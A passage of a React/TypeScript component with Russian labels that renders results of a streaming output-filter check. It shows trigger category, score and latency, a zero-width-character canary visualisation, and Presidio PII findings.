            <button onClick={runTest} disabled={testRunning || !testText.trim()}
              className="self-start px-4 py-2 bg-accent text-white rounded-md text-[13px] font-medium hover:opacity-90 disabled:opacity-50 transition-opacity flex items-center gap-2">
              <Play className="w-3.5 h-3.5 fill-current" />
              {testRunning ? "Выполнение..." : "Запустить проверку"}
            </button>

            {testError && (
              <div className="text-[12px] text-status-critical px-3 py-2 rounded-md bg-[rgba(229,72,77,0.08)]">{testError}</div>
            )}
          </div>

          {/* Results */}
          <div className="content-card flex flex-col gap-4 min-h-[400px]">
            <div className="flex items-center gap-2">
              <Shield className="w-4 h-4 text-text-secondary" />
              <h3 className="text-body-strong">Результат</h3>
            </div>

            {!testResult ? (
              <div className="flex-1 flex flex-col items-center justify-center text-text-tertiary gap-2 text-center">
                <Shield className="w-8 h-8 opacity-20" />
                <span className="text-[13px]">Запустите проверку для просмотра результата</span>
              </div>
            ) : (
              <>
                <div className={cn(
                  "px-4 py-3 rounded-xl border flex flex-col gap-1.5",
                  testResult.triggered
                    ? "bg-[rgba(229,72,77,0.08)] border-[rgba(229,72,77,0.3)]"
                    : "bg-[rgba(70,167,88,0.08)] border-[rgba(70,167,88,0.3)]"
                )}>
                  <div className="flex items-center gap-2">
                    <span className={cn(
                      "text-[13px] font-bold uppercase",
                      testResult.triggered ? "text-status-critical" : "text-status-success"
                    )}>
                      {testResult.triggered ? "ПОТОК ОБОРВАН" : "ЧИСТО"}
                    </span>
                    <span className="text-[11px] text-text-tertiary ml-auto">
                      {testResult.chunks_processed} чанков, {testResult.final_text_length} chars
                    </span>
                  </div>
                  {testResult.first_trigger && (
                    <>
                      <div className="text-[12px] text-text-primary">
                        <span className="text-text-tertiary">Категория:</span>{" "}
                        <code className="bg-surface-2 px-1.5 py-0.5 rounded text-[11px]">{testResult.first_trigger.category}</code>
                      </div>
                      <div className="text-[12px] text-text-primary">
                        <span className="text-text-tertiary">Чанк #{testResult.first_trigger.chunk_index + 1}</span>{" "}
                        · score {testResult.first_trigger.score.toFixed(2)}{" "}
                        · {testResult.first_trigger.latency_ms.toFixed(1)} мс
                      </div>
                      {testResult.first_trigger.reason && (
                        <div className="text-[11px] text-text-tertiary font-mono break-all">
                          {testResult.first_trigger.reason}
                        </div>
                      )}
                    </>
                  )}
                </div>

                {testResult.canary_used && (
                  <div className="flex flex-col gap-1 px-3 py-2 rounded-md bg-surface-2 border border-border-subtle">
                    <span className="text-[10px] uppercase tracking-wider text-text-tertiary font-medium">Внедрённый canary (визуализация ZW-символов)</span>
                    <code className="text-[10px] text-text-secondary break-all">
                      {Array.from(testResult.canary_used).map(c => {
                        const cp = c.codePointAt(0)!;
                        return cp === 0x200b ? "[ZWSP]" : cp === 0x200c ? "[ZWNJ]" : cp === 0x200d ? "[ZWJ]" : cp === 0x2060 ? "[WJ]" : c;
                      }).join("")}
                    </code>
                    <span className="text-[10px] text-text-tertiary">{testResult.canary_used.length} символов = 64 бит энтропии</span>
                  </div>
                )}

                {testResult.presidio_findings && testResult.presidio_findings.length > 0 && (
                  <div className="flex flex-col gap-2">
                    <span className="text-[12px] font-medium">Presidio нашёл (post-stream):</span>
                    <div className="flex flex-wrap gap-1.5">
                      {testResult.presidio_findings.map(f => (
                        <span key={f} className="px-2 py-0.5 rounded bg-[rgba(151,88,255,0.1)] border border-[rgba(151,88,255,0.3)] text-[11px] text-[#9758FF]">
                          {f}
                        </span>
                      ))}
                    </div>
                    <span className="text-[10px] text-text-tertiary">Эти категории Presidio покрывает, regex — нет. Не блокируется в потоке, только логируется.</span>
                  </div>
                )}

                {testResult.presidio_findings !== null && testResult.presidio_findings.length === 0 && (
                  <span className="text-[11px] text-text-tertiary">Presidio: ничего не найдено</span>
                )}

                {testResult.all_triggers.length > 1 && (
                  <div className="flex flex-col gap-1">
                    <span className="text-[11px] uppercase tracking-wider text-text-tertiary font-medium">Все срабатывания ({testResult.all_triggers.length})</span>
                    {testResult.all_triggers.map((t, i) => (
                      <div key={i} className="text-[11px] px-2 py-1 rounded bg-surface-2 border border-border-subtle">
                        #{t.chunk_index + 1} · <code>{t.category}</code> · score {t.score.toFixed(2)}
                      </div>
                    ))}
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
